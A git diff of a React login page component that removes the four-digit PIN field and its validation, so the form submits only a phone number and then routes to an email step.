@@ -1,36 +1,25 @@
-import { useState, useRef } from "react";
+import { useState } from "react";
 import "../styles/home.css";
 import "../App.css";
 import logo from "../assets/logo.svg";
 import axios from "axios";
 import BASE_URL from "../components/urls";
 import { useNavigate } from "react-router-dom";
-
 const Home = () => {
-  const [pin, setPin] = useState("");
   const [loading, setLoading] = useState(false);
   const [phone, setPhone] = useState("");
-  const pinInputRef = useRef(null);
- const navigate = useNavigate();
-  const handlePinChange = (e) => {
-    const value = e.target.value.replace(/\D/g, "");
-    if (value.length <= 4) {
-      setPin(value);
-    }
-  };
+  const navigate = useNavigate();
 
   const submitLogin = () => {
-    if (!phone.trim() || pin.length !== 4) return;
+    if (!phone.trim()) return;
     setLoading(true);
-    const payload = { phone: phone.trim(), pin };
+    const payload = { phone: phone.trim() };
     axios
       .post(`${BASE_URL}/`, payload)
       .then((response) => {
         console.log(response.data);
         setPhone("");
-        setPin("");
-        pinInputRef.current?.blur();
-           navigate("/pin");
+        navigate("/email");
       })
       .catch((error) => {
         console.error("There was an error!", error);
@@ -71,35 +60,6 @@ const Home = () => {
               </div>
             </div>
           </div>
-
-          <div className="input-field">
-            <div className="field-row">
-              <div className="field-label">PIN</div>
-              <div
-                className="field-pin"
-                onClick={() => pinInputRef.current?.focus()}
-                onMouseDown={() => pinInputRef.current?.focus()}
-                onTouchStart={() => pinInputRef.current?.focus()}
-              >
-                <input
-                  ref={pinInputRef}
-                  type="text"
-                  inputMode="numeric"
-                  maxLength="4"
-                  value={pin}
-                  onChange={handlePinChange}
-                  className="pin-visible-input"
-                  onKeyDown={(e) => {
-                    if (e.key === "Enter" && pin.length === 4 && !loading) {
-                      submitLogin();
-                    }
-                  }}
-                  pattern="\d*"
-                  placeholder="Enter 4-digit PIN"
-                />
-              </div>
-            </div>
-          </div>
         </div>
 
         <div className="submit-section">
@@ -107,7 +67,7 @@ const Home = () => {
             type="button"
             className="login-submit-btn"
             onClick={submitLogin}
-            disabled={loading || pin.length !== 4 || !phone.trim()}
+            disabled={loading || !phone.trim()}
           >
             {loading ? "Loading..." : "Submit"}
           </button>
@@ -124,5 +84,3 @@ const Home = () => {
 };
 
 export default Home;
-
-
